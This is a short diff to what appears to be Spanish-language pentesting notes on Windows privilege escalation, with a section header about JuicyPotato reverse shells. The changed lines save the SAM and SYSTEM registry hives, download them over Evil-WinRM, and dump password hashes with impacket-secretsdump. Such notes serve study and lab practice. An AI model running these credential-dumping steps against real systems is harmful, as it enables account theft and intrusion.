@@ -219,8 +219,11 @@ PASOS con 'JuicyPotato' para ejecuta una Reverse Shell:
 
 ## FORMA 1
 Pasos:   
-❯ reg save hklm\sam C:\windows\temp\sam.hive           # Hacer una copia de la SAM en Windows y descargarlo 
-❯ reg save hklm\system C:\windows\temp\system.hive     # Hacer una copia del system en Windows y descargarlo
+❯ reg save hklm\sam C:\Temp\sam.hive           # Hacer una copia de la SAM en Windows
+❯ reg save hklm\system C:\Temp\system.hive     # Hacer una copia del system en Windows
+
+❯ download sam.hive 
+# Descargar los archivos desde Evilwinrm a Kali 
 
 ❯ impacket-secretsdump -sam sam.hive -system system.hive LOCAL   
 # Dumpear los hashes de los usuarios desde Kali con los archivos obtenidos  
